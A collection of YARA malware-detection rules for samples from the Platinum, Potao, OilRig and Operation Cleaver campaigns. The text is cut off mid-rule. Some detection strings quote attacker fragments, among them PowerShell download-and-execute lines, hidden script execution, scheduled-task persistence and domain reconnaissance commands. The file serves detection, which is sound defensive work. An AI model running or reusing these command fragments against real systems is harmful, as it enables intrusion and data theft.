rule SSC_Trojan_Win32_Plakpeer : Platinum
{
meta:
author = "Microsoft"
description = "Zc tool v2"
original_sample_sha1 = "2155c20483528377b5e3fde004bb604198463d29"
unpacked_sample_sha1 = "dc991ef598825daabd9e70bac92c79154363bab2"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = "@@E0020(%d)" wide
$str2 = /exit.{0,3}@exit.{0,3}new.{0,3}query.{0,3}rcz.{0,3}scz/ wide
$str3 = "---###---" wide
$str4 = "---@@@---" wide
condition:
$str1 and $str2 and $str3 and $str4
}
rule SSC_Trojan_Win32_PlaSrv : Platinum
{
meta:
author = "Microsoft"
description = "Hotpatching Injector"
original_sample_sha1 = "ff7f949da665ba8ce9fb01da357b51415634eaad"
unpacked_sample_sha1 = "dff2fee984ba9f5a8f5d97582c83fca4fa1fe131"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$Section_name = ".hotp1"
$offset_x59 = { C7 80 64 01 00 00 00 00 01 00 }
condition:
$Section_name and $offset_x59
}
rule SSC_Trojan_Win32_Placisc3 : Platinum
{
meta:
author = "Microsoft"
description = "Dipsind variant"
original_sample_sha1 = "1b542dd0dacfcd4200879221709f5fa9683cdcda"
unpacked_sample_sha1 = "bbd4992ee3f3a3267732151636359cf94fb4575d"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = {BA 6E 00 00 00 66 89 95 ?? ?? FF FF B8 73 00 00 00 66 89 85 ?? ?? FF FF B9 64 00 00 00 66 89 8D ?? ?? FF FF BA 65 00 00 00 66 89 95 ?? ?? FF FF B8 6C 00 00 00}
$str2 = "VPLRXZHTU"
$str3 = {8B 44 24 ?? 8A 04 01 41 32 C2 3B CF 7C F2 88 03}
condition:
$str1 and $str2 and $str3
}
rule SSC_Trojan_Win32_Platual : Platinum
{
meta:
author = "Microsoft"
description = "Installer component"
original_sample_sha1 = "e0ac2ae221328313a7eee33e9be0924c46e2beb9"
unpacked_sample_sha1 = "ccaf36c2d02c3c5ca24eeeb7b1eae7742a23a86a"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$class_name = "AVCObfuscation"
$scrambled_dir = { A8 8B B8 E3 B1 D7 FE 85 51 32 3E C0 F1 B7 73 99 }
condition:
$class_name and $scrambled_dir
}
rule SSC_Trojan_Win32_Plainst : Platinum
{
meta:
author = "Microsoft"
description = "Installer component"
original_sample_sha1 = "99c08d31af211a0e17f92dd312ec7ca2b9469ecb"
unpacked_sample_sha1 = "dcb6cf7cf7c8fdfc89656a042f81136bda354ba6"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = {66 8B 14 4D 18 50 01 10 8B 45 08 66 33 14 70 46 66 89 54 77 FE 66 83 7C 77 FE 00 75 B7 8B 4D FC 89 41 08 8D 04 36 89 41 0C 89 79 04}
$str2 = {4b D3 91 49 A1 80 91 42 83 B6 33 28 36 6B 90 97}
condition:
$str1 and $str2
}
rule SSC_Trojan_Win32_Plabit : Platinum
{
meta:
author = "Microsoft"
description = "Installer component"
sample_sha1 = "6d1169775a552230302131f9385135d385efd166"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = {4b D3 91 49 A1 80 91 42 83 B6 33 28 36 6B 90 97}
$str2 = "GetInstanceW"
$str3 = {8B D0 83 E2 1F 8A 14 0A 30 14 30 40 3B 44 24 04 72 EE}
condition:
$str1 and $str2 and $str3
}
rule SSC_Trojan_Win32_Placisc2 : Platinum
{
meta:
author = "Microsoft"
description = "Dipsind variant"
original_sample_sha1 = "bf944eb70a382bd77ee5b47548ea9a4969de0527"
unpacked_sample_sha1 = "d807648ddecc4572c7b04405f496d25700e0be6e"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = {76 16 8B D0 83 E2 07 8A 4C 14 24 8A 14 18 32 D1 88 14 18 40 3B C7 72 EA}
$str2 = "VPLRXZHTU"
$str3 = "%d) Command:%s"
$str4 = {0D 0A 2D 2D 2D 2D 2D 09 2D 2D 2D 2D 2D 2D 0D 0A}
condition:
$str1 and $str2 and $str3 and $str4
}
rule SSC_Trojan_Win32_Plapiio : Platinum
{
meta:
author = "Microsoft"
description = "JPin backdoor"
original_sample_sha1 = "3119de80088c52bd8097394092847cd984606c88"
unpacked_sample_sha1 = "3acb8fe2a5eb3478b4553907a571b6614eb5455c"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = "ServiceMain"
$str2 = "Startup"
$str3 = {C6 45 ?? 68 C6 45 ?? 4D C6 45 ?? 53 C6 45 ?? 56 C6 45 ?? 6D C6 45 ?? 6D}
condition:
$str1 and $str2 and $str3
}
rule SSC_Trojan_Win32_Plaklog : Platinum
{
meta:
author = "Microsoft"
description = "Hook-based keylogger"
original_sample_sha1 = "831a5a29d47ab85ee3216d4e75f18d93641a9819"
unpacked_sample_sha1 = "e18750207ddbd939975466a0e01bd84e75327dda"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = "++[%s^^unknown^^%s]++"
$str2 = "vtfs43/emm"
$str3 = {33 C9 39 4C 24 08 7E 10 8B 44 24 04 03 C1 80 00 08 41 3B 4C 24 08 7C F0 C3}
condition:
$str1 and $str2 and $str3
}
rule SSC_Trojan_Win32_Plagicom : Platinum
{
meta:
author = "Microsoft"
description = "Installer component"
original_sample_sha1 = "99dcb148b053f4cef6df5fa1ec5d33971a58bd1e"
unpacked_sample_sha1 = "c1c950bc6a2ad67488e675da4dfc8916831239a7"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = {C6 44 24 ?? 68 C6 44 24 ?? 4D C6 44 24 ?? 53 C6 44 24 ?? 56 C6 44 24 ??
00}
$str2 = "OUEMM/EMM"
$str3 = {85 C9 7E 08 FE 0C 10 40 3B C1 7C F8 C3}
condition:
$str1 and $str2 and $str3
}
rule SSC_Trojan_Win32_Plagon : Platinum
{
meta:
author = "Microsoft"
description = "Dipsind variant"
original_sample_sha1 = "48b89f61d58b57dba6a0ca857bce97bab636af65"
unpacked_sample_sha1 = "6dccf88d89ad7b8611b1bc2e9fb8baea41bdb65a"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = "VPLRXZHTU"
$str2 = {64 6F 67 32 6A 7E 6C}
$str3 = "Dqpqftk(Wou\"Isztk)"
$str4 = "StartThreadAtWinLogon"
condition:
$str1 and $str2 and $str3 and $str4
}
rule SSC_Trojan_Win32_Plakpers : Platinum
{
meta:
author = "Microsoft"
description = "Injector / loader component"
original_sample_sha1 = "fa083d744d278c6f4865f095cfd2feabee558056"
unpacked_sample_sha1 = "3a678b5c9c46b5b87bfcb18306ed50fadfc6372e"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = "MyFileMappingObject"
$str2 = "[%.3u]  %s  %s  %s [%s:" wide
$str3 = "%s\\{%s}\\%s" wide
condition:
$str1 and $str2 and $str3
}
rule SSC_Trojan_Win32_PlaKeylog_B : Platinum
{
meta:
author = "Microsoft"
description = "Keylogger component"
original_sample_sha1 = "0096a3e0c97b85ca75164f48230ae530c94a2b77"
unpacked_sample_sha1 = "6a1412daaa9bdc553689537df0a004d44f8a45fd"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$hook = {C6 06 FF 46 C6 06 25}
$dasm_engine = {80 C9 10 88 0E 8A CA 80 E1 07 43 88 56 03 80 F9 05}
condition:
$hook and $dasm_engine
}
rule SSC_Trojan_Win32_Adupib : Platinum
{
meta:
author = "Microsoft"
description = "Adupib SSL Backdoor"
original_sample_sha1 = "d3ad0933e1b114b14c2b3a2c59d7f8a95ea0bcbd"
unpacked_sample_sha1 = "a80051d5ae124fd9e5cc03e699dd91c2b373978b"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = "POLL_RATE"
$str2 = "OP_TIME(end hour)"
$str3 = "%d:TCP:*:Enabled"
$str4 = "%s[PwFF_cfg%d]"
$str5 = "Fake_GetDlgItemTextW: ***value***="
condition:
$str1 and $str2 and $str3 and $str4 and $str5
}
rule SSC_Trojan_Win32_Plainst2 : Platinum
{
meta:
author = "Microsoft"
description = "Zc tool"
original_sample_sha1 = "3f2ce812c38ff5ac3d813394291a5867e2cddcf2"
unpacked_sample_sha1 = "88ff852b1b8077ad5a19cc438afb2402462fbd1a"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$str1 = "Connected [%s:%d]..."
$str2 = "reuse possible: %c"
$str3 = "] => %d%%\x0a"
condition:
$str1 and $str2 and $str3
}
rule SSC_Trojan_Win32_Dipsind_B : Platinum
{
meta:
author = "Microsoft"
description = "Dipsind Family"
sample_sha1 = "09e0dfbb5543c708c0dd6a89fd22bbb96dc4ca1c"
activity_group = "Platinum"
version = "1.0"
last_modified = "2016-04-12"
strings:
$frg1 = {8D 90 04 01 00 00 33 C0 F2 AE F7 D1 2B F9 8B C1 8B F7 8B FA C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 4D EC 8B 15 ?? ?? ?? ?? 89 91 ?? 07 00 00 }
$frg2 = {68 A1 86 01 00 C1 E9 02 F3 AB 8B CA 83 E1 03 F3 AA}
$frg3 = {C0 E8 07 D0 E1 0A C1 8A C8 32 D0 C0 E9 07 D0 E0 0A C8 32 CA 80 F1 63}
condition:
$frg1 and $frg2 and $frg3
}
rule SSC_PotaoDll
{
strings:
$mz = { 4d 5a }
$dllstr1 = "?AVCncBuffer@@"
$dllstr2 = "?AVCncRequest@@"
$dllstr3 = "Petrozavodskaya, 11, 9"
$dllstr4 = "_Scan@0"
$dllstr5 = "\x00/sync/document/"
$dllstr6 = "\\temp.temp"
$dllname1 = "node69MainModule.dll"
$dllname2 = "node69-main.dll"
$dllname3 = "node69MainModuleD.dll"
$dllname4 = "task-diskscanner.dll"
$dllname5 = "\x00Screen.dll"
$dllname6 = "Poker2.dll"
$dllname7 = "PasswordStealer.dll"
$dllname8 = "KeyLog2Runner.dll"
$dllname9 = "GetAllSystemInfo.dll"
$dllname10 = "FilePathStealer.dll"
condition:
($mz at 0) and (any of ($dllstr*) and any of ($dllname*))
}
rule SSC_PotaoUSB
{
strings:
$mz = { 4d 5a }
$binary1 = { 33 C0 8B C8 83 E1 03 BA ?? ?? ?? 00 2B D1 8A 0A 32 88 ?? ?? ?? 00 2A C8 FE C9 88 88 ?? ?? ?? 00 40 3D ?? ?? 00 00 7C DA C3 }
$binary2 = { 55 8B EC 51 56 C7 45 FC 00 00 00 00 EB 09 8B 45 FC 83 C0 01 89 45 FC 81 7D FC ?? ?? 00 00 7D 3D 8B 4D FC 0F BE 89 ?? ?? ?? 00 8B 45 FC 33 D2 BE 04 00 00 00 F7 F6 B8 03 00 00 00 2B C2 0F BE 90 ?? ?? ?? 00 33 CA 2B 4D FC 83 E9 01 81 E1 FF 00 00 00 8B 45 FC 88 88 ?? ?? ?? 00 EB B1 5E 8B E5 5D C3}
condition:
($mz at 0) and any of ($binary*)
}
rule SSC_PotaoDecoy
{
strings:
$mz = { 4d 5a }
$str1 = "eroqw11"
$str2 = "2sfsdf"
$str3 = "RtlDecompressBuffer"
$wiki_str = "spanned more than 100 years and ruined three consecutive" wide
$old_ver1 = {53 68 65 6C 6C 33 32 2E 64 6C 6C 00 64 61 66 73 72 00 00 00 64 61 66 73 72 00 00 00 64 6F 63 (00 | 78)}
$old_ver2 = {6F 70 65 6E 00 00 00 00 64 6F 63 00 64 61 66 73 72 00 00 00 53 68 65 6C 6C 33 32 2E 64 6C 6C 00}
condition:
($mz at 0) and ( (all of ($str*)) or any of ($old_ver*) or $wiki_str )
}
rule SSC_PotaoSecondStage
{
strings:
$mz = { 4d 5a }
// hash of CryptBinaryToStringA and CryptStringToBinaryA
$binary1 = {51 7A BB 85 [10-180] E8 47 D2 A8}
// old hash of CryptBinaryToStringA and CryptStringToBinaryA
$binary2 = {5F 21 63 DD [10-30] EC FD 33 02}
$binary3 = {CA 77 67 57 [10-30] BA 08 20 7A}
$str1 = "?AVCrypt32Import@@"
$str2 = "%.5llx"
condition:
($mz at 0) and any of ($binary*) and any of ($str*)
}
rule SSC_OpClandestineWolf
{
meta:
alert_severity = "HIGH"
log = "false"
author = "NDF"
weight = 10
alert = true
source = " https://www.fireeye.com/blog/threat-research/2015/06/operation-clandestine-wolf-adobe-flash-zero-day.html"
version = 1
date = "2015-06-23"
description = "Operation Clandestine Wolf signature based on OSINT from 06.23.15"
hash0 = "1a4b710621ef2e69b1f7790ae9b7a288"
hash1 = "917c92e8662faf96fffb8ffe7b7c80fb"
hash2 = "975b458cb80395fa32c9dda759cb3f7b"
hash3 = "3ed34de8609cd274e49bbd795f21acc4"
hash4 = "b1a55ec420dd6d24ff9e762c7b753868"
hash5 = "afd753a42036000ad476dcd81b56b754"
hash6 = "fad20abf8aa4eda0802504d806280dd7"
hash7 = "ab621059de2d1c92c3e7514e4b51751a"
hash8 = "510b77a4b075f09202209f989582dbea"
hash9 = "d1b1abfcc2d547e1ea1a4bb82294b9a3"
hash10 = "4692337bf7584f6bda464b9a76d268c1"
hash11 = "7cae5757f3ba9fef0a22ca0d56188439"
hash12 = "1a7ba923c6aa39cc9cb289a17599fce0"
hash13 = "f86db1905b3f4447eb5728859f9057b5"
hash14 = "37c6d1d3054e554e13d40ea42458ebed"
hash15 = "3e7430a09a44c0d1000f76c3adc6f4fa"
hash16 = "98eb249e4ddc4897b8be6fe838051af7"
hash17 = "1b57a7fad852b1d686c72e96f7837b44"
hash18 = "ffb84b8561e49a8db60e0001f630831f"
hash19 = "98eb249e4ddc4897b8be6fe838051af7"
hash20 = "dfb4025352a80c2d81b84b37ef00bcd0"
hash21 = "4457e89f4aec692d8507378694e0a3ba"
hash22 = "48de562acb62b469480b8e29821f33b8"
hash23 = "7a7eed9f2d1807f55a9308e21d81cccd"
hash24 = "6817b29e9832d8fd85dcbe4af176efb6"
strings:
$s0 = "flash.Media.Sound()"
$s1 = "call Kernel32!VirtualAlloc(0x1f140000hash$=0x10000hash$=0x1000hash$=0x40)"
$s2 = "{4D36E972-E325-11CE-BFC1-08002BE10318}"
$s3 = "NetStream"
condition:
all of them
}
rule SSC_OilRig_Malware_Campaign_Gen3
{
meta:
description = "Detects malware from OilRig Campaign"
author = "Florian Roth"
reference = "https://goo.gl/QMRZ8K"
date = "2016-10-12"
hash1 = "5e9ddb25bde3719c392d08c13a295db418d7accd25d82d020b425052e7ba6dc9"
hash2 = "bd0920c8836541f58e0778b4b64527e5a5f2084405f73ee33110f7bc189da7a9"
hash3 = "90639c7423a329e304087428a01662cc06e2e9153299e37b1b1c90f6d0a195ed"
strings:
$x1 = "source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlrrrr" fullword ascii
$x2 = "\\Libraries\\fireueye.vbs" fullword ascii
$x3 = "\\Libraries\\fireeye.vbs&" fullword wide
condition:
( uint16(0) == 0xcfd0 and filesize < 100KB and 1 of them )
}
rule SSC_OilRig_Malware_Campaign_Gen2
{
meta:
description = "Detects malware from OilRig Campaign"
author = "Florian Roth"
reference = "https://goo.gl/QMRZ8K"
date = "2016-10-12"
hash1 = "c6437f57a8f290b5ec46b0933bfa8a328b0cb2c0c7fbeea7f21b770ce0250d3d"
hash2 = "293522e83aeebf185e653ac279bba202024cedb07abc94683930b74df51ce5cb"
strings:
$s1 = "%userprofile%\\AppData\\Local\\Microsoft\\ " fullword ascii
$s2 = "$fdn=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" fullword ascii
$s3 = "&{$rn = Get-Random; $id = 'TR" fullword ascii
$s4 = "') -replace '__',('DNS'+$id) | " fullword ascii
$s5 = "\\upd.vbs" fullword ascii
$s6 = "schtasks /create /F /sc minute /mo " fullword ascii
$s7 = "') -replace '__',('HTP'+$id) | " fullword ascii
$s8 = "&{$rn = Get-Random -minimum 1 -maximum 10000; $id = 'AZ" fullword ascii
$s9 = "http://www.israirairlines.com/?mode=page&page=14635&lang=eng<" fullword ascii
condition:
( uint16(0) == 0xcfd0 and filesize < 4000KB and 2 of ($s*) ) or ( 4 of them )
}
rule SSC_OilRig_Malware_Campaign_Mal2
{
meta:
description = "Detects malware from OilRig Campaign"
author = "Florian Roth"
reference = "https://goo.gl/QMRZ8K"
date = "2016-10-12"
hash1 = "65920eaea00764a245acb58a3565941477b78a7bcc9efaec5bf811573084b6cf"
strings:
$x1 = "wss.Run \"powershell.exe \" & Chr(34) & \"& {(Get-Content $env:Public\\Libraries\\update.vbs) -replace '__',(Get-Random) | Set-C" ascii
$x2 = "Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\"%PUBLIC%\") & \"\\Libraries\\update.vbs\")" fullword ascii
$x3 = "mailto:Mohammed.sarah@gratner.com" fullword wide
$x4 = "mailto:Tarik.Imam@gartner.com" fullword wide
$x5 = "Call Extract(DnsPs1, wss.ExpandEnvironmentStrings(\"%PUBLIC%\") & \"\\Libraries\\dns.ps1\")" fullword ascii
$x6 = "2dy53My5vcmcvMjAw" fullword wide /* base64 encoded string 'w.w3.org/200' */
condition:
( uint16(0) == 0xcfd0 and filesize < 200KB and 1 of them )
}
rule SSC_OilRig_Campaign_Reconnaissance
{
meta:
description = "Detects Windows discovery commands - known from OilRig Campaign"
author = "Florian Roth"
reference = "https://goo.gl/QMRZ8K"
date = "2016-10-12"
hash1 = "5893eae26df8e15c1e0fa763bf88a1ae79484cdb488ba2fc382700ff2cfab80c"
strings:
$s1 = "whoami & hostname & ipconfig /all" ascii
$s2 = "net user /domain 2>&1 & net group /domain 2>&1" ascii
$s3 = "net group \"domain admins\" /domain 2>&1 & " ascii
condition:
( filesize < 1KB and 1 of them )
}
rule SSC_OilRig_Malware_Campaign_Gen1
{
meta:
description = "Detects malware from OilRig Campaign"
author = "Florian Roth"
reference = "https://goo.gl/QMRZ8K"
date = "2016-10-12"
hash1 = "d808f3109822c185f1d8e1bf7ef7781c219dc56f5906478651748f0ace489d34"
hash2 = "80161dad1603b9a7c4a92a07b5c8bce214cf7a3df897b561732f9df7920ecb3e"
hash3 = "662c53e69b66d62a4822e666031fd441bbdfa741e20d4511c6741ec3cb02475f"
hash4 = "903b6d948c16dc92b69fe1de76cf64ab8377893770bf47c29bf91f3fd987f996"
hash5 = "c4fbc723981fc94884f0f493cb8711fdc9da698980081d9b7c139fcffbe723da"
hash6 = "57efb7596e6d9fd019b4dc4587ba33a40ab0ca09e14281d85716a253c5612ef4"
hash7 = "1b2fee00d28782076178a63e669d2306c37ba0c417708d4dc1f751765c3f94e1"
hash8 = "9f31a1908afb23a1029c079ee9ba8bdf0f4c815addbe8eac85b4163e02b5e777"
hash9 = "0cd9857a3f626f8e0c07495a4799c59d502c4f3970642a76882e3ed68b790f8e"
hash10 = "4b5112f0fb64825b879b01d686e8f4d43521252a3b4f4026c9d1d76d3f15b281"
hash11 = "4e5b85ea68bf8f2306b6b931810ae38c8dff3679d78da1af2c91032c36380353"
hash12 = "c3c17383f43184a29f49f166a92453a34be18e51935ddbf09576a60441440e51"
hash13 = "f3856c7af3c9f84101f41a82e36fc81dfc18a8e9b424a3658b6ba7e3c99f54f2"
hash14 = "0c64ab9b0c122b1903e8063e3c2c357cbbee99de07dc535e6c830a0472a71f39"
hash15 = "d874f513a032ccb6a5e4f0cd55862b024ea0bee4de94ccf950b3dd894066065d"
hash16 = "8ee628d46b8af20c4ba70a2fe8e2d4edca1980583171b71fe72455c6a52d15a9"
hash17 = "55d0e12439b20dadb5868766a5200cbbe1a06053bf9e229cf6a852bfcf57d579"
hash18 = "528d432952ef879496542bc62a5a4b6eee788f60f220426bd7f933fa2c58dc6b"
hash19 = "93940b5e764f2f4a2d893bebef4bf1f7d63c4db856877020a5852a6647cb04a0"
hash20 = "e2ec7fa60e654f5861e09bbe59d14d0973bd5727b83a2a03f1cecf1466dd87aa"
hash21 = "9c0a33a5dc62933f17506f20e0258f877947bdcd15b091a597eac05d299b7471"
hash22 = "a787c0e42608f9a69f718f6dca5556607be45ec77d17b07eb9ea1e0f7bb2e064"
hash23 = "3772d473a2fe950959e1fd56c9a44ec48928f92522246f75f4b8cb134f4713ff"
hash24 = "3986d54b00647b507b2afd708b7a1ce4c37027fb77d67c6bc3c20c3ac1a88ca4"
hash25 = "f5a64de9087b138608ccf036b067d91a47302259269fb05b3349964ca4060e7e"
strings:
$x1 = "Get-Content $env:Public\\Libraries\\update.vbs) -replace" ascii
$x2 = "wss.Run \"powershell.exe \" & Chr(34) & \"& {waitfor haha /T 2}\" & Chr(34), 0" fullword ascii
$x3 = "Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\"%PUBLIC%\") & \"\\Libraries\\update.vbs\")" fullword ascii
$s4 = "CreateObject(\"WScript.Shell\").Run cmd, 0o" fullword ascii
/* Base64 encode config */
/* $global:myhost = */
$b1 = "JGdsb2JhbDpteWhvc3QgP" ascii
/* HOME="%public%\Libraries\" */
$b2 = "SE9NRT0iJXB1YmxpYyVcTGlicmFyaWVzX" ascii
/* Set wss = CreateObject("wScript.Shell") */
$b3 = "U2V0IHdzcyA9IENyZWF0ZU9iamVjdCgid1NjcmlwdC5TaGV" ascii
/* $scriptdir = Split-Path -Parent -Path $ */
$b4 = "JHNjcmlwdGRpciA9IFNwbGl0LVBhdGggLVBhcmVudCAtUGF0aCA" ascii
/* \x0aSet wss = CreateObject("wScript.Shell") */
$b5 = "DQpTZXQgd3NzID0gQ3JlYXRlT2JqZWN" ascii
/* whoami & hostname */
$b6 = "d2hvYW1pICYgaG9zdG5hb" ascii
condition:
( uint16(0) == 0xcfd0 and filesize < 700KB and 1 of them )
}
rule SSC_OilRig_Malware_Campaign_Mal1
{
meta:
description = "Detects malware from OilRig Campaign"
author = "Florian Roth"
reference = "https://goo.gl/QMRZ8K"
date = "2016-10-12"
hash1 = "e17e1978563dc10b73fd54e7727cbbe95cc0b170a4e7bd0ab223e059f6c25fcc"
strings:
$x1 = "DownloadExecute=\"powershell \"\"&{$r=Get-Random;$wc=(new-object System.Net.WebClient);$wc.DownloadFile(" ascii
$x2 = "-ExecutionPolicy Bypass -File \"&HOME&\"dns.ps1\"" fullword ascii
$x3 = "CreateObject(\"WScript.Shell\").Run Replace(DownloadExecute,\"-_\",\"bat\")" fullword ascii
$x4 = "CreateObject(\"WScript.Shell\").Run DnsCmd,0" fullword ascii
$s1 = "http://winodwsupdates.me" ascii
condition:
( uint16(0) == 0x4f48 and filesize < 4KB and 1 of them ) or ( 2 of them )
}
rule SSC_OilRig_Malware_Campaign_Mal3
{
meta:
description = "Detects malware from OilRig Campaign"
author = "Florian Roth"
reference = "https://goo.gl/QMRZ8K"
date = "2016-10-12"
hash1 = "02226181f27dbf59af5377e39cf583db15200100eea712fcb6f55c0a2245a378"
strings:
$x1 = "(Get-Content $env:Public\\Libraries\\dns.ps1) -replace ('#'+'##'),$botid | Set-Content $env:Public\\Libraries\\dns.ps1" fullword ascii
$x2 = "Invoke-Expression ($global:myhome+'tp\\'+$global:filename+'.bat > '+$global:myhome+'tp\\'+$global:filename+'.txt')" fullword ascii
$x3 = "('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))" fullword ascii
condition:
( filesize < 10KB and 1 of them )
}
rule SSC_LoggerModule
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "%s-%02d%02d%02d%02d%02d.r"
$s2 = "C:\\Users\\%s\\AppData\\Cookies\\"
condition:
all of them
}
rule SSC_wndTest
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "[Alt]" wide
$s2 = "<< %s >>:" wide
$s3 = "Content-Disposition: inline; comp=%s; account=%s; product=%d;"
condition:
all of them
}
rule SSC_OPCLEAVER_Parviz_Developer
{
meta:
description = "Parviz developer known from Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Florian Roth"
score = "70"
strings:
$s1 = "Users\\parviz\\documents\\" nocase
condition:
$s1
}
rule SSC_OPCLEAVER_zhmimikatz
{
meta:
description = "Mimikatz wrapper used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "MimikatzRunner"
$s2 = "zhmimikatz"
condition:
all of them
}
rule SSC_pvz_out
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "Network Connectivity Module" wide
$s2 = "OSPPSVC" wide
condition:
all of them
}
rule SSC_zhLookUp
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "zhLookUp.Properties"
condition:
all of them
}
rule SSC_NetC
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "NetC.exe" wide
$s2 = "Net Service"
condition:
all of them
}
rule SSC_csext
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "COM+ System Extentions"
$s2 = "csext.exe"
$s3 = "COM_Extentions_bin"
condition:
all of them
}
rule SSC_OPCLEAVER_LoggerModule
{
meta:
description = "Keylogger used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "%s-%02d%02d%02d%02d%02d.r"
$s2 = "C:\\Users\\%s\\AppData\\Cookies\\"
condition:
all of them
}
rule SSC_OPCLEAVER_SmartCopy2
{
meta:
description = "Malware or hack tool used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "SmartCopy2.Properties"
$s2 = "ZhuFrameWork"
condition:
all of them
}
rule SSC_OPCLEAVER_Jasus
{
meta:
description = "ARP cache poisoner used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "pcap_dump_open"
$s2 = "Resolving IPs to poison..."
$s3 = "WARNNING: Gateway IP can not be found"
condition:
all of them
}
rule SSC_SynFlooder
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "Unable to resolve [ %s ]. ErrorCode %d"
$s2 = "your target's IP is : %s"
$s3 = "Raw TCP Socket Created successfully."
condition:
all of them
}
rule SSC_OPCLEAVER_CCProxy_Config
{
meta:
description = "CCProxy config known from Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Florian Roth"
score = "70"
strings:
$s1 = "UserName=User-001" fullword ascii
$s2 = "Web=1" fullword ascii
$s3 = "Mail=1" fullword ascii
$s4 = "FTP=0" fullword ascii
$x1 = "IPAddressLow=78.109.194.114" fullword ascii
condition:
all of ($s*) or $x1
}
rule SSC_OPCLEAVER_BackDoorLogger
{
meta:
description = "Keylogger used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "BackDoorLogger"
$s2 = "zhuAddress"
condition:
all of them
}
rule SSC_OPCLEAVER_pvz_out
{
meta:
description = "Parviz tool used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "Network Connectivity Module" wide
$s2 = "OSPPSVC" wide
condition:
all of them
}
rule SSC_Jasus
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "pcap_dump_open"
$s2 = "Resolving IPs to poison..."
$s3 = "WARNNING: Gateway IP can not be found"
condition:
all of them
}
rule SSC_pvz_in
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "LAST_TIME=00/00/0000:00:00PM$"
$s2 = "if %%ERRORLEVEL%% == 1 GOTO line"
condition:
all of them
}
rule SSC_OPCLEAVER_antivirusdetector
{
meta:
description = "Hack tool used by attackers in Operation Cleaver"
reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
date = "2014/12/02"
author = "Cylance Inc."
score = "70"
strings:
$s1 = "getShadyProcess"
$s2 = "getSystemAntiviruses"
$s3 = "AntiVirusDetector"
condition:
all of them
}
rule SSC_BackDoorLogger
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "BackDoorLogger"
$s2 = "zhuAddress"
condition:
all of them
}
rule SSC_TinyZBot
{
meta:
author = "Cylance"
date = "2014-12-02"
description = "http://cylance.com/opcleaver"
strings:
$s1 = "NetScp" wide
$s2 = "TinyZBot.Properties.Resources.resources"
$s3 = "Aoao WaterMark"
$s4 = "Run_a_exe"
$s5 = "netscp.exe"
$s6 = "get_MainModule_WebReference_DefaultWS"
$s7 = "remove_CheckFileMD5Completed"
$s8 = "http://tempuri.org/"
$s9 = "Zhoupin_Cleaver"
condition:
($s1 and $s2) or ($s3 and $s4 and $s5) or ($s6 and $s7 and $s8) or ($s9)
}
rule SSC_OPCLEAVER_NetC
{
meta:
description = "Net Crawler used by attackers in Operation Cleaver"
